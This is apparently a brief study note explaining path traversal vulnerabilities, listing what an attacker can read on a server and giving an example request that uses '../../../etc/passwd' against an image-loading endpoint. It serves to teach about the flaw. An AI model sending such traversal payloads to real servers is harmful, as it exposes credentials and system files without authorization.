--- ---

<h2>Overview</h2>

![[Screenshot from 2022-12-02 11-06-41.png]]

- Allows an attacker to read files on the server that is running the application
	- Code
	- Data
	- Credentials
	- Sensitive OS files
	- Might even be able to write to files on the server

Example Exploit:
- Shopping application that loads images via HTML:
```
<imgsrc="/loadImage?filename=218.png">
```
- Attacker could request the following:
```
https://insecure-website.com/loadImage?filename=../../../etc/passwd
```
